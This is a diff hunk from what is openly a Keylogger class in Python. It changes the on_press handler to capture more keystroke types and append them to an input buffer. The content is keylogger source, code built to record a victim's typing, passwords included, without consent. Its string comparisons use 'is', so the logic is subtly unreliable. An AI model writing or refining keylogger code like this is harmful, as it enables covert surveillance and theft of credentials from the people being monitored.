@@ -29,7 +29,7 @@ class Keylogger:
     def on_press(self, key):
         last_key = ''
         if str(key)[
-            0] is '\'':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
+            0] is "'" or str(key)[0] is '"':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
             last_key = str(key)[1:-1]
             self.input_buffer += last_key
         elif str(key)[0] is '<':  # we don't need numbers on right of keyboard
